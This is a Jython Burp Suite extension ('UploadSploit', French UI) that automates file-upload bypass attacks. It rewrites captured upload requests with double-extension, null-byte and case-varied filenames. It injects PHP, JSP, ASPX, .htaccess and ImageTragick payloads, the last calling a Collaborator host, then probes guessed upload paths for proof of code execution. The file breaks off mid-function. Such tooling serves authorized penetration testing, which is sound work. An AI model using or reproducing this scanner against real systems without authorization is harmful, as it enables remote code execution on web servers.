#!/usr/bin/env python
# -*- coding: utf-8 -*-
from burp import IBurpExtender, IContextMenuFactory, ITab
from java.util import ArrayList
from javax.swing import JPanel, JLabel, JTextArea, JScrollPane, JButton, JRadioButton, ButtonGroup, JSplitPane, BorderFactory, SwingUtilities, JMenuItem, JTextField
from java.awt import BorderLayout, GridBagLayout, GridBagConstraints, Color
from java.lang import Runnable, Thread
import re
import datetime
import time
import hashlib

FX_EXT_MIME = {
    "jpeg": "image/jpeg",
    "jpg": "image/jpeg",
    "jpe": "image/jpeg",
    "bmp": "image/x-ms-bmp",
    "png": "image/png",
    "tiff": "image/tiff",
    "tif": "image/tiff",
    "svg": "image/svg+xml",
    "svgz": "image/svg+xml",
    "mvg": "application/octet-stream",
    "gif": "image/gif",
    "ico": "image/vnd.microsoft.icon",
    "asc": "text/plain",
    "txt": "text/plain",
    "text": "text/plain",
    "pot": "text/plain",
    "brf": "text/plain",
    "srt": "text/plain",
    "pdf": "application/pdf",
    "ppt": "application/vnd.ms-powerpoint",
    "pps": "application/vnd.ms-powerpoint",
    "pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    "odt": "application/vnd.oasis.opendocument.text",
    "xls": "application/vnd.ms-excel",
    "xlb": "application/vnd.ms-excel",
    "xlt": "application/vnd.ms-excel",
    "doc": "application/msword",
    "dot": "application/msword",
    "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "mpeg": "video/mpeg",
    "mpg": "video/mpeg",
    "mpe": "video/mpeg",
    "mpga": "audio/mpeg",
    "mpega": "audio/mpeg",
    "mp2": "audio/mpeg",
    "mp3": "audio/mpeg",
    "m4a": "audio/mpeg",
    "avi": "video/x-msvideo",
    "m3u": "audio/x-mpegurl",
    "wav": "audio/x-wav",
    "psd": "image/x-photoshop",
    "flv": "video/x-flv",
    "mp4": "video/mp4",
    "tar": "application/x-tar",
    "gz": "application/gzip",
    "zip": "application/zip",
    "rar": "application/rar",
    "7z": "application/x-7z-compressed",
    "iso": "application/x-iso9660-image",
    "jar": "application/java-archive",
    "csv": "text/csv",
    "rss": "application/x-rss+xml",
    "css": "text/css",
    "torrent": "application/x-bittorrent",
    "html": "text/html",
    "htm": "text/html",
    "shtml": "text/html",
    "otf": "application/font-sfnt",
    "ttf": "application/font-sfnt",
    "com": "application/x-msdos-program",
    "exe": "application/x-msdos-program",
    "bat": "application/x-msdos-program",
    "dll": "application/x-msdos-program",
    "qt": "video/quicktime",
    "mov": "video/quicktime",
    "cbr": "application/x-cbr",
    "vcd": "application/x-cdlink",
    "~": "application/x-trash",
    "%": "application/x-trash",
    "bak": "application/x-trash",
    "old": "application/x-trash",
    "sik": "application/x-trash",
    "bin": "application/octet-stream",
    "deploy": "application/octet-stream",
    "msu": "application/octet-stream",
    "msp": "application/octet-stream",
    "mid": "audio/midi",
    "midi": "audio/midi",
    "kar": "audio/midi",
    "cer": "chemical/x-cerius",
    "sdf": "chemical/x-mdl-sdfile",
    "vcf": "text/vcard",
    "vcard": "text/vcard",
    "c++": "text/x-c++src",
    "cpp": "text/x-c++src",
    "cxx": "text/x-c++src",
    "cc": "text/x-c++src",
    "h": "text/x-chdr",
    "kmz": "application/vnd.google-earth.kmz",
    "swf": "application/x-shockwave-flash",
    "swfl": "application/x-shockwave-flash",
    "deb": "application/x-debian-package",
    "ddeb": "application/vnd.debian.binary-package",
    "udeb": "application/x-debian-package",
    "js": "application/javascript",
    "sit": "application/x-stuffit",
    "sitx": "application/x-stuffit",
    "class": "application/java-vm",
    "hqx": "application/mac-binhex40",
    "sql": "application/x-sql",
    "ra": "audio/x-pn-realaudio",
    "rm": "audio/x-pn-realaudio",
    "ram": "audio/x-pn-realaudio",
    "pl": "text/x-perl",
    "pm": "text/x-perl",
    "rtf": "application/rtf",
    "asp": "text/asp",
    "phtml": "application/x-httpd-php",
    "pht": "application/x-httpd-php",
    "php": "application/x-httpd-php",
    "sh": "text/x-sh",
    "c": "text/x-csrc",
    "3gp": "video/3gpp",
    "apk": "application/vnd.android.package-archive",
    "inp": "chemical/x-gamess-input",
    "gam": "chemical/x-gamess-input",
    "gamin": "chemical/x-gamess-input",
    "ps": "application/postscript",
    "ai": "application/postscript",
    "eps": "application/postscript",
    "epsi": "application/postscript",
    "epsf": "application/postscript",
    "eps2": "application/postscript",
    "eps3": "application/postscript",
    "tex": "text/x-tex",
    "ltx": "text/x-tex",
    "sty": "text/x-tex",
    "cls": "text/x-tex",
    "mdb": "application/msaccess",
    "wmv": "video/x-ms-wmv",
    "kml": "application/vnd.google-earth.kml+xml",
    "aif": "audio/x-aiff",
    "aiff": "audio/x-aiff",
    "aifc": "audio/x-aiff",
    "pdb": "chemical/x-pdb",
    "ent": "chemical/x-pdb",
    "asf": "video/x-ms-asf",
    "asx": "video/x-ms-asf",
    "prf": "application/pics-rules",
    "java": "text/x-java",
    "wma": "audio/x-ms-wma",
    "cab": "application/x-cab",
    "dmg": "application/x-apple-diskimage",
    "key": "application/pgp-keys",
    "ics": "text/calendar",
    "icz": "text/calendar",
    "xhtml": "application/xhtml+xml",
    "xht": "application/xhtml+xml",
    "xml": "application/xml",
    "xsd": "application/xml",
    "wpd": "application/vnd.wordperfect",
    "msi": "application/x-msi",
    "rpm": "application/x-redhat-package-manager",
    "py": "text/x-python"
}

FX_BASE_PATHS = [
    "uploads/",
    "upload/",
    "files/",
    "file/",
    "uploaded/",
    "uploadfiles/",
    "useruploads/",
    "assets/uploads/",
    "media/",
    "images/",
    "documents/",
    "tmp/",
    "temp/",
    "fichiers/",
    "fichier/",
    "up/",
    "uf/",
    "Upload/",
    "Uploads/",
    "UploadedFiles/",
    "App_Data/Uploads/",
    "Content/uploads/",
    "resources/uploads/",
    "web/uploads/",
    "www/uploads/",
    "public/uploads/",
    "storage/uploads/",
    "var/uploads/",
    "files/user/",
    "avatar/",
    "profile/",
    "pictures/",
    "gallery/",
    "attachments/",
    "upload/[0-9a-zA-Z]*/"
]

FX_TECHNIQUES = [
    {"suffix": ".$nastyExt$", "mime": "nasty"},
    {"suffix": ".$nastyExt$", "mime": "legit"},
    {"suffix": ".$nastyExt$.$legitExt$", "mime": "nasty"},
    {"suffix": ".$nastyExt$.$legitExt$", "mime": "legit"},
    {"suffix": ".$legitExt$.$nastyExt$", "mime": "nasty"},
    {"suffix": ".$legitExt$.$nastyExt$", "mime": "legit"},
    {"suffix": ".$nastyExt$%00.$legitExt$", "mime": "legit"},
    {"suffix": ".$nastyExt$%00.$legitExt$", "mime": "nasty"},
    {"suffix": ".$legitExt$%00.$nastyExt$", "mime": "legit"},
    {"suffix": ".$legitExt$%00.$nastyExt$", "mime": "nasty"}
]

FX_TEMPLATES = [
    {
        "name": "phpinfo",
        "backend": "php",
        "nastyExt": "php",
        "extVariants": ["php1", "php2", "php3", "php4", "php5", "phtml", "pht", "Php", "PhP", "pHp", "pHp1", "pHP2", "pHtMl", "PHp5"],
        "payload": "<?php\n\tphpinfo();\n?>",
        "codeExecRegex": "\\<h2\\>PHP License\\<\\/h2\\>"
    },
    {
        "name": "nastygif",
        "backend": "php",
        "nastyExt": "php",
        "extVariants": ["php1", "php2", "php3", "php4", "php5", "phtml", "pht", "Php", "PhP", "pHp", "pHp1", "pHP2", "pHtMl", "PHp5"],
        "payload": "GIF89a;<?php phpinfo(); ?>",
        "codeExecRegex": "\\<title\\>phpinfo\\(\\)\\<\\/title\\>(.|\\n)*\\<h2\\>PHP License\\<\\/h2\\>"
    },
    {
        "name": "nastyjpg",
        "backend": "php",
        "nastyExt": "php",
        "extVariants": ["php1", "php2", "php3", "php4", "php5", "phtml", "pht", "Php", "PhP", "pHp", "pHp1", "pHP2", "pHtMl", "PHp5"],
        "payload": "FFD8FFE0PHPINFO",  # simplifie
        "codeExecRegex": "\\<h2\\>PHP License\\<\\/h2\\>"
    },
    {
        "name": "basicjsp",
        "backend": "jsp",
        "nastyExt": "jsp",
        "extVariants": ["JSP", "jSp"],
        "payload": "<%= 1000+337 %>",
        "codeExecRegex": "1337"
    },
    {
        "name": "imagetragick",
        "backend": "all",
        "nastyExt": None,
        "extVariants": [],
        "payload": "push graphic-context\nviewbox 0 0 640 480\nfill 'url($COLLAB_URL$/image.jpg\"|echo ImageTragick Detected! > \"$filename$.txt)'\npop graphic-context\n",
        "codeExecRegex": "ImageTragick Detected!"
    },
    {
        "name": "htaccess",
        "backend": "php",
        "nastyExt": None,
        "extVariants": [],
        "payload": "#Matches the .htaccess file itself\n<Files \".htaccess\">\n    Require all granted\n    ForceType application/x-httpd-php\n</Files>\n",
        "codeExecRegex": "\\<h2\\>PHP License\\<\\/h2\\>"
    },
    {
        "name": "basicaspx",
        "backend": "aspx",
        "nastyExt": "aspx",
        "extVariants": ["asp", "asp1", "aspx1", "AsPx", "AsP", "aSpX"],
        "payload": "<script language=\"C#\" runat=\"server\">Response.Write(1337*7331);</script><%=1337*7331%>${1337*7331}<%:1337*7331%><%$1337*7331%><#= 1337*7331 #>",
        "codeExecRegex": "9801547"
    },
    {
        "name": "basicasp",
        "backend": "asp",
        "nastyExt": "asp",
        "extVariants": ["asp", "Asp", "aSp", "ASP", "asp1", "Asp1", "aSp1", "ASP1"],
        "payload": "<%@ Page Language=\"C#\" %><%Response.Write(1337*7331);%>",
        "codeExecRegex": "9801547"
    }
]


def load_fuxploider_data():
    return


class UploadSploitTab(JPanel, ITab):
    def __init__(self, callbacks, helpers, collabCtx=None):
        JPanel.__init__(self)
        self.callbacks = callbacks
        self.helpers = helpers
        self.collabCtx = collabCtx
        load_fuxploider_data()
        self.currentRequestResponse = None
        self.setLayout(BorderLayout())

        self.infoArea = JTextArea()
        self.infoArea.setEditable(False)
        self.infoArea.setLineWrap(True)
        self.infoArea.setWrapStyleWord(True)

        self.requestArea = JTextArea()
        self.requestArea.setEditable(False)

        self.notRegexField = JTextField(25)
        self.trueRegexField = JTextField(25)
        self.uploadsPathField = JTextField(20)
        self.pathsField = JTextField(25)
        self.threadsField = JTextField(3)
        self.threadsField.setText("4")
        self.progressLabel = JLabel("Idle")
        self.verboseCheckbox = JRadioButton("Verbose", False)
        self.scanPaused = False
        self.scanStopped = False
        self.scanWorkerRunning = False
        self.rceFound = False
        self.rceRequest = None
        self.rceHttpService = None

        self.backendGroup = ButtonGroup()
        self.phpRadio = JRadioButton("PHP", True)
        self.jspRadio = JRadioButton("JSP")
        self.aspRadio = JRadioButton("ASP")
        self.allRadio = JRadioButton("All")
        self.backendGroup.add(self.phpRadio)
        self.backendGroup.add(self.jspRadio)
        self.backendGroup.add(self.aspRadio)
        self.backendGroup.add(self.allRadio)

        self.generateButton = JButton("Generer variantes (Repeater)", actionPerformed=self.generateVariants)
        self.startScanButton = JButton("Start", actionPerformed=self.onStartScan)
        self.pauseScanButton = JButton("Pause", actionPerformed=self.onPauseScan)
        self.stopScanButton = JButton("Stop", actionPerformed=self.onStopScan)
        self.replayRceButton = JButton("Replay RCE", actionPerformed=self.onReplayRCE)
        self.replayRceButton.setEnabled(False)

        topPanel = JPanel()
        topPanelLayout = GridBagLayout()
        topPanel.setLayout(topPanelLayout)
        c = GridBagConstraints()
        c.gridx = 0
        c.gridy = 0
        c.anchor = GridBagConstraints.WEST
        topPanel.add(JLabel("Backend cible :"), c)
        c.gridx = 1
        topPanel.add(self.phpRadio, c)
        c.gridx = 2
        topPanel.add(self.jspRadio, c)
        c.gridx = 3
        topPanel.add(self.aspRadio, c)
        c.gridx = 4
        topPanel.add(self.allRadio, c)
        c.gridx = 0
        c.gridy = 1
        c.gridwidth = 1
        topPanel.add(JLabel("Regex echec (NOT) :"), c)
        c.gridx = 1
        c.gridwidth = 2
        topPanel.add(self.notRegexField, c)
        c.gridx = 3
        c.gridwidth = 1
        topPanel.add(JLabel("Regex succes (TRUE) :"), c)
        c.gridx = 4
        topPanel.add(self.trueRegexField, c)
        c.gridx = 0
        c.gridy = 2
        c.gridwidth = 2
        topPanel.add(self.generateButton, c)
        c.gridx = 2
        c.gridwidth = 1
        topPanel.add(JLabel("Threads :"), c)
        c.gridx = 3
        topPanel.add(self.threadsField, c)
        c.gridx = 4
        topPanel.add(self.startScanButton, c)
        c.gridx = 5
        topPanel.add(self.pauseScanButton, c)
        c.gridx = 6
        topPanel.add(self.stopScanButton, c)
        c.gridx = 0
        c.gridy = 3
        c.gridwidth = 1
        topPanel.add(JLabel("Uploads path (optional) :"), c)
        c.gridx = 1
        c.gridwidth = 4
        topPanel.add(self.uploadsPathField, c)
        c.gridx = 0
        c.gridy = 4
        c.gridwidth = 1
        topPanel.add(JLabel("Chemins candidats (csv) :"), c)
        c.gridx = 1
        c.gridwidth = 6
        self.pathsField.setText("uploads/,upload/,files/,file/,uploaded/,uploadfiles/,useruploads/,assets/uploads/,media/,images/,documents/,tmp/,temp/,fichiers/,fichier/,up/,uf/,Upload/,Uploads/,UploadedFiles/,App_Data/Uploads/,Content/uploads/,resources/uploads/,web/uploads/,www/uploads/,public/uploads/,storage/uploads/,var/uploads/,files/user/,avatar/,profile/,pictures/,gallery/,attachments/,upload/[0-9a-zA-Z]*/")
        topPanel.add(self.pathsField, c)
        c.gridx = 0
        c.gridy = 5
        c.gridwidth = 2
        topPanel.add(self.verboseCheckbox, c)
        c.gridx = 2
        c.gridwidth = 5
        topPanel.add(self.progressLabel, c)

        rcePanel = JPanel()
        rcePanel.setBorder(BorderFactory.createTitledBorder("RCE FOUND"))
        rcePanel.add(self.replayRceButton)

        infoScroll = JScrollPane(self.infoArea)
        infoScroll.setBorder(BorderFactory.createTitledBorder("Informations UploadSploit"))

        requestScroll = JScrollPane(self.requestArea)
        requestScroll.setBorder(BorderFactory.createTitledBorder("Requete selectionnee"))

        split = JSplitPane(JSplitPane.VERTICAL_SPLIT, infoScroll, requestScroll)
        split.setResizeWeight(0.4)

        self.add(topPanel, BorderLayout.NORTH)
        self.add(rcePanel, BorderLayout.SOUTH)
        self.add(split, BorderLayout.CENTER)

    def log(self, text):
        def updater():
            current = self.infoArea.getText()
            if current:
                self.infoArea.setText(current + "\n" + text)
            else:
                self.infoArea.setText(text)
        self.callbacks.printOutput(text)
        SwingUtilities.invokeLater(updater)

    def updateProgress(self, done, total):
        colorRed = Color.RED
        colorBlack = Color.BLACK
        def updater():
            self.progressLabel.setText("Scan : %d / %d" % (done, total))
            if "RCE" in self.progressLabel.getText():
                self.progressLabel.setForeground(colorRed)
            else:
                self.progressLabel.setForeground(colorBlack)
        SwingUtilities.invokeLater(updater)

    def updateTabAppearance(self, rceFound=False):
        colorRed = Color(255, 200, 200)
        def updater():
            if rceFound:
                self.rceFound = True
                self.setBackground(colorRed)
            else:
                self.rceFound = False
                self.setBackground(None)
            try:
                self.callbacks.customizeUiComponent(self)
            except:
                pass
        SwingUtilities.invokeLater(updater)

    def onStartScan(self, event):
        if self.scanWorkerRunning:
            self.scanPaused = False
            self.log("[UploadSploit] Scan resume")
        else:
            self.scanPaused = False
            self.scanStopped = False
            self.rceFound = False
            self.rceRequest = None
            self.rceHttpService = None
            self.updateTabAppearance(False)
            def disableReplay():
                self.replayRceButton.setEnabled(False)
            SwingUtilities.invokeLater(disableReplay)
            self.runAutomaticScan(event)

    def onPauseScan(self, event):
        if self.scanWorkerRunning:
            self.scanPaused = True
            self.log("[UploadSploit] Scan pause")

    def onStopScan(self, event):
        if self.scanWorkerRunning:
            self.scanStopped = True
            self.log("[UploadSploit] Scan stop demande")

    def onReplayRCE(self, event):
        if self.rceRequest and self.rceHttpService:
            try:
                self.callbacks.sendToRepeater(
                    self.rceHttpService.getHost(),
                    self.rceHttpService.getPort(),
                    self.rceHttpService.getProtocol() == "https",
                    self.rceRequest,
                    "UploadSploit-Replay-RCE"
                )
                self.log("[UploadSploit] Requete RCE envoyee dans Repeater")
            except Exception as e:
                self.log("[UploadSploit] Erreur lors de l'envoi de la requete RCE: %s" % e)

    def getTabCaption(self):
        if self.rceFound:
            return "UploadSploit [RCE]"
        return "UploadSploit"

    def getUiComponent(self):
        return self

    def setRequestResponse(self, messageInfo):
        self.currentRequestResponse = messageInfo
        if not messageInfo:
            self.infoArea.setText("")
            self.requestArea.setText("")
            return

        request = messageInfo.getRequest()
        analyzed = self.helpers.analyzeRequest(messageInfo)
        headers = analyzed.getHeaders()
        body = request[analyzed.getBodyOffset():]

        self.requestArea.setText(self.helpers.bytesToString(request))

        filename = "inconnu"
        contentType = "inconnu"
        authenticated = False

        for h in headers:
            lower = h.lower()
            if lower.startswith("cookie:") or lower.startswith("authorization:"):
                authenticated = True

        try:
            bodyStr = self.helpers.bytesToString(body)
            idx = bodyStr.find("filename=\"")
            if idx != -1:
                endIdx = bodyStr.find("\"", idx + 10)
                if endIdx != -1:
                    filename = bodyStr[idx + 10:endIdx]
            ctIdx = bodyStr.lower().find("content-type:")
            if ctIdx != -1:
                endLine = bodyStr.find("\r\n", ctIdx)
                if endLine == -1:
                    endLine = len(bodyStr)
                contentType = bodyStr[ctIdx + len("content-type:"):endLine].strip()
        except Exception as e:
            self.callbacks.printError("Erreur parsing body: %s" % e)

        detectedBackend = None
        try:
            url = analyzed.getUrl()
            urlPath = url.getPath().lower()
            if any(ext in urlPath for ext in [".php", ".php1", ".php2", ".php3", ".php4", ".php5", ".phtml", ".pht"]):
                detectedBackend = "php"
                self.phpRadio.setSelected(True)
            elif any(ext in urlPath for ext in [".asp", ".aspx"]):
                detectedBackend = "asp"
                self.aspRadio.setSelected(True)
            elif ".jsp" in urlPath:
                detectedBackend = "jsp"
                self.jspRadio.setSelected(True)
        except Exception as e:
            self.callbacks.printError("Erreur detection backend depuis URL: %s" % e)

        infoLines = []
        infoLines.append("Nom du fichier detecte : %s" % filename)
        infoLines.append("Content-Type declare : %s" % contentType)
        infoLines.append("Requete authentifiee : %s" % ("Oui" if authenticated else "Non"))
        if detectedBackend:
            infoLines.append("Backend auto-detection : %s" % detectedBackend.upper())
        infoLines.append("")
        infoLines.append("Selectionne un backend, configure eventuellement les regex, les chemins, puis utilise \"Generer variantes\" ou \"Lancer scan auto\".")
        self.infoArea.setText("\n".join(infoLines))

        self.log("[UploadSploit] Requete chargee, fichier='%s', contentType='%s', auth=%s" % (filename, contentType, authenticated))
        if detectedBackend:
            self.log("[UploadSploit] Backend auto-selectionne : %s" % detectedBackend.upper())
        self.updateTabAppearance(True)

    def generateVariants(self, event):
        if not self.currentRequestResponse:
            self.log("[UploadSploit] Aucune requete selectionnee.")
            return

        backend = "php"
        if self.jspRadio.isSelected():
            backend = "jsp"
        elif self.aspRadio.isSelected():
            backend = "asp"
        elif self.allRadio.isSelected():
            backend = "all"

        self.log("[UploadSploit] Generation de variantes pour backend=%s" % backend)

        messageInfo = self.currentRequestResponse
        request = messageInfo.getRequest()
        analyzed = self.helpers.analyzeRequest(messageInfo)
        headers = analyzed.getHeaders()
        body = request[analyzed.getBodyOffset():]
        bodyStr = self.helpers.bytesToString(body)
        contextPath = "/"
        try:
            fullUrl = analyzed.getUrl()
            path = fullUrl.getPath()
            if path:
                lastSlash = path.rfind("/")
                if lastSlash > 0:
                    contextPath = path[:lastSlash]
        except Exception:
            contextPath = "/"

        filename = "inconnu"
        idx = bodyStr.find("filename=\"")
        if idx != -1:
            endIdx = bodyStr.find("\"", idx + 10)
            if endIdx != -1:
                filename = bodyStr[idx + 10:endIdx]

        self.log("[UploadSploit] Fichier d'origine detecte: %s" % filename)

        baseName = filename
        dotIdx = filename.rfind(".")
        if dotIdx != -1:
            baseName = filename[:dotIdx]
        try:
            hashBase = hashlib.sha1(filename).hexdigest()[:12]
            baseName = hashBase
        except Exception:
            pass

        targets = []
        if backend in ("php", "all"):
            targets.append("php")
        if backend in ("jsp", "all"):
            targets.append("jsp")
        if backend in ("asp", "all"):
            targets.append("asp")

        techniques = []
        for ext in targets:
            techniques.append(("%s" % ext, ".%s" % ext))
            techniques.append(("%s-double" % ext, ".%s.jpg" % ext))
            techniques.append(("%s-nullbyte" % ext, ".%s%%00.jpg" % ext))

        for name, suffix in techniques:
            newName = baseName + suffix
            self.log("[UploadSploit] Variante %s : %s" % (name, newName))
            variantBody = bodyStr.replace("filename=\"%s\"" % filename, "filename=\"%s\"" % newName)
            variantRequest = self._buildVariantRequest(headers, variantBody)
            self.callbacks.sendToRepeater(messageInfo.getHttpService().getHost(),
                                          messageInfo.getHttpService().getPort(),
                                          messageInfo.getHttpService().getProtocol() == "https",
                                          variantRequest,
                                          "UploadSploit-%s" % name)

    def _buildVariantRequest(self, headers, bodyStr):
        bodyBytes = self.helpers.stringToBytes(bodyStr)
        return self.helpers.buildHttpMessage(headers, bodyBytes)

    def _buildBodyWithPayload(self, headers, bodyStr, oldFilename, newFilename, payload):
        boundary = None
        for h in headers:
            lower = h.lower()
            if lower.startswith("content-type:") and "boundary=" in lower:
                parts = h.split("boundary=", 1)[1].strip()
                if parts.startswith("\"") and parts.endsWith("\""):
                    parts = parts[1:-1]
                boundary = parts
                break

        bodyStr = bodyStr.replace("filename=\"%s\"" % oldFilename, "filename=\"%s\"" % newFilename)

        if not boundary:
            return bodyStr

        idx = bodyStr.find("filename=\"%s\"" % newFilename)
        if idx == -1:
            return bodyStr

        headerEnd = bodyStr.find("\r\n\r\n", idx)
        if headerEnd == -1:
            return bodyStr

        dataStart = headerEnd + 4
        nextBoundaryToken = "\r\n--" + boundary
        dataEnd = bodyStr.find(nextBoundaryToken, dataStart)
        if dataEnd == -1:
            return bodyStr

        return bodyStr[:dataStart] + payload + bodyStr[dataEnd:]

    def _buildSimpleGet(self, httpService, path):
        host = httpService.getHost()
        req = "GET %s HTTP/1.1\r\nHost: %s\r\n\r\n" % (path, host)
        return self.helpers.stringToBytes(req)

    def runAutomaticScan(self, event):
        worker = UploadSploitScanWorker(self)
        Thread(worker).start()

    def _doAutomaticScan(self):
        self.scanWorkerRunning = True
        if not self.currentRequestResponse:
            self.log("[UploadSploit] Aucune requete selectionnee.")
            self.scanWorkerRunning = False
            return

        backend = "php"
        if self.jspRadio.isSelected():
            backend = "jsp"
        elif self.aspRadio.isSelected():
            backend = "asp"
        elif self.allRadio.isSelected():
            backend = "all"

        notRegex = self.notRegexField.getText().strip()
        trueRegex = self.trueRegexField.getText().strip()

        self.log("[UploadSploit] Scan auto : backend=%s, notRegex='%s', trueRegex='%s'" % (backend, notRegex, trueRegex))

        notPattern = None
        truePattern = None
        if notRegex:
            try:
                notPattern = re.compile(notRegex)
            except Exception as e:
                self.log("[UploadSploit] Regex NOT invalide: %s" % e)
        if trueRegex:
            try:
                truePattern = re.compile(trueRegex)
            except Exception as e:
                self.log("[UploadSploit] Regex TRUE invalide: %s" % e)

        messageInfo = self.currentRequestResponse
        request = messageInfo.getRequest()
        analyzed = self.helpers.analyzeRequest(messageInfo)
        headers = analyzed.getHeaders()
        body = request[analyzed.getBodyOffset():]
        bodyStr = self.helpers.bytesToString(body)

        contextPath = "/"
        try:
            fullUrl = analyzed.getUrl()
            path = fullUrl.getPath()
            if path:
                lastSlash = path.rfind("/")
                if lastSlash > 0:
                    contextPath = path[:lastSlash]
        except Exception:
            contextPath = "/"

        filename = "inconnu"
        idx = bodyStr.find("filename=\"")
        if idx != -1:
            endIdx = bodyStr.find("\"", idx + 10)
            if endIdx != -1:
                filename = bodyStr[idx + 10:endIdx]

        baseName = filename
        dotIdx = filename.rfind(".")
        legitExt = None
        if dotIdx != -1:
            baseName = filename[:dotIdx]
            legitExt = filename[dotIdx + 1:].lower()
        try:
            hashBase = hashlib.sha1(filename).hexdigest()[:12]
            baseName = hashBase
        except Exception:
            pass

        targets = []
        if backend in ("php", "all"):
            targets.append("php")
        if backend in ("jsp", "all"):
            targets.append("jsp")
        if backend in ("asp", "all"):
            targets.append("asp")
            targets.append("aspx")

        if FX_TEMPLATES:
            selectedTemplates = [t for t in FX_TEMPLATES if t["backend"] in targets]
        else:
            selectedTemplates = []

        httpService = messageInfo.getHttpService()
        results = []
        uploadsPath = self.uploadsPathField.getText().strip()
        candidatePathsRaw = self.pathsField.getText().strip()
        candidateBases = list(FX_BASE_PATHS)
        if candidatePathsRaw:
            for p in candidatePathsRaw.split(","):
                p = p.strip()
                if p:
                    candidateBases.append(p)

        totalAttempts = 0
        verbose = self.verboseCheckbox.isSelected()

        for tmpl in selectedTemplates:
            nastyExt = tmpl["nastyExt"]
            if not legitExt and nastyExt:
                continue
            variants = [nastyExt] + tmpl.get("extVariants", []) if nastyExt else [legitExt]
            totalAttempts += len(FX_TECHNIQUES) * len(variants)
        if totalAttempts == 0:
            self.scanWorkerRunning = False
            return

        attemptIndex = 0
        self.updateProgress(0, totalAttempts)

        for tmpl in selectedTemplates:
            nastyExt = tmpl["nastyExt"]
            variants = [nastyExt] + tmpl.get("extVariants", []) if nastyExt else []
            for tech in (FX_TECHNIQUES or []):
                suffix_pattern = tech.get("suffix", "")
                mimeChoice = tech.get("mime", "legit")
                for vext in (variants or [legitExt]):
                    if not legitExt:
                        continue
                    suffix = suffix_pattern.replace("$legitExt$", legitExt).replace("$nastyExt$", vext)
                    newName = baseName + suffix
                    if mimeChoice == "legit":
                        desiredMime = FX_EXT_MIME.get(legitExt)
                    else:
                        desiredMime = FX_EXT_MIME.get(vext)
                    if self.scanStopped:
                        break
                    while self.scanPaused and not self.scanStopped:
                        time.sleep(0.2)
                    if self.scanStopped:
                        break
                    attemptIndex += 1
                    self.updateProgress(attemptIndex, totalAttempts)
                    if verbose:
                        self.log("[UploadSploit] [SCAN] Envoi variante %s (template %s) : %s" % (suffix_pattern, tmpl["name"], newName))
                    payload = tmpl["payload"]
                    if tmpl["name"] == "imagetragick" and self.collabCtx:
                        try:
                            collabUrl = self.collabCtx.generatePayload(True)
                            payload = payload.replace("$COLLAB_URL$", collabUrl)
                            if verbose:
                                self.log("[UploadSploit] Utilisation Collaborator pour imagetragick: %s" % collabUrl)
                        except Exception as e:
                            if verbose:
                                self.log("[UploadSploit] Impossible de generer un payload Collaborator: %s" % e)
                    variantBody = self._buildBodyWithPayload(headers, bodyStr, filename, newName, payload)
                    variantRequest = self._buildVariantRequest(headers, variantBody)
                    response = self.callbacks.makeHttpRequest(httpService, variantRequest)
                    responseInfo = self.helpers.analyzeResponse(response.getResponse())
                    status = responseInfo.getStatusCode()
                    bodyOffset = responseInfo.getBodyOffset()
                    resBody = self.helpers.bytesToString(response.getResponse()[bodyOffset:])

                    uploaded = True
                    codeExec = False
                    codeUrl = None

                    if notPattern and notPattern.search(resBody):
                        uploaded = False

                    execPattern = None
                    if truePattern:
                        execPattern = truePattern
                    else:
                        try:
                            execPattern = re.compile(tmpl["codeExecRegex"])
                        except Exception as e:
                            if verbose:
                                self.log("[UploadSploit] Regex de template invalide pour %s: %s" % (tmpl["name"], e))

                    rceRequest = None
                    rceHttpService = None
                    if execPattern and execPattern.search(resBody):
                        uploaded = True
                        codeExec = True
                        codeUrl = "(upload response)"
                        rceRequest = variantRequest
                        rceHttpService = httpService
                    else:
                        candidateUrls = []
                        cleanName = newName.split("%00", 1)[0]
                        if uploadsPath:
                            candidateUrls.append("/%s/%s" % (uploadsPath.strip("/"), cleanName))
                        for base in candidateBases:
                            b = base.strip()
                            if not b:
                                continue
                            if b == "upload/[0-9a-zA-Z]*/":
                                chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                for ch in chars:
                                    candidateUrls.append("/upload/%s/%s" % (ch, cleanName))
                            else:
                                candidateUrls.append("/%s/%s" % (b.strip("/"), cleanName))
                        if contextPath and contextPath != "/":
                            prefixed = []
                            for u in candidateUrls:
                                if u.startswith("/"):
                                    prefixed.append(contextPath.rstrip("/") + u)
                                else:
                                    prefixed.append(contextPath.rstrip("/") + "/" + u)
                            candidateUrls.extend(prefixed)
                        now = datetime.datetime.utcnow()
                        year = now.year
                        month = now.month
                        candidateUrls.append("/uploads/%04d/%s" % (year, cleanName))
                        candidateUrls.append("/uploads/%04d/%02d/%s" % (year, month, cleanName))
                        candidateUrls.append("/upload/%04d/%02d/%s" % (year, month, cleanName))
                        try:
                            pattern = re.compile(r"(/[^\"'\s]*%s)" % re.escape(cleanName))
                            for m in pattern.finditer(resBody):
                                candidateUrls.append(m.group(1))
                        except Exception:
                            pass
                        seen = set()
                        for urlPath in candidateUrls:
                            if not execPattern:
                                break
                            if urlPath in seen:
                                continue
                            seen.add(urlPath)
                            getRequest = self._buildSimpleGet(httpService, urlPath)
                            getResponse = self.callbacks.makeHttpRequest(httpService, getRequest)
                            getInfo = self.helpers.analyzeResponse(getResponse.getResponse())
                            getBody = self.helpers.bytesToString(getResponse.getResponse()[getInfo.getBodyOffset():])
                            if execPattern.search(getBody):
                                codeExec = True
                                codeUrl = urlPath
                                rceRequest = variantRequest
                                rceHttpService = httpService
                                break

                    if codeExec and codeUrl and rceRequest and rceHttpService:
                        self.scanPaused = True
                        self.updateTabAppearance(True)
                        self.rceRequest = rceRequest
                        self.rceHttpService = rceHttpService
                        def enableReplay():
                            self.replayRceButton.setEnabled(True)
                        SwingUtilities.invokeLater(enableReplay)
                        try:
                            self.callbacks.sendToRepeater(httpService.getHost(),
                                                          httpService.getPort(),
                                                          httpService.getProtocol() == "https",
                                                          self._buildSimpleGet(httpService, codeUrl) if codeUrl != "(upload response)" else variantRequest,
                                                          "UploadSploit-RCE-%s" % tmpl["name"])
                        except Exception:
                            pass

                    if verbose:
                        self.log("[UploadSploit] [SCAN] Variante %s => HTTP %s, uploaded=%s, codeExec=%s" % (suffix_pattern, status, uploaded, codeExec))
                    if codeExec:
                        self.log("[UploadSploit] FOUND RCE! File URL: %s" % codeUrl)
                    results.append((tmpl["name"], suffix_pattern, newName, status, uploaded, codeExec, codeUrl))

        lines = []
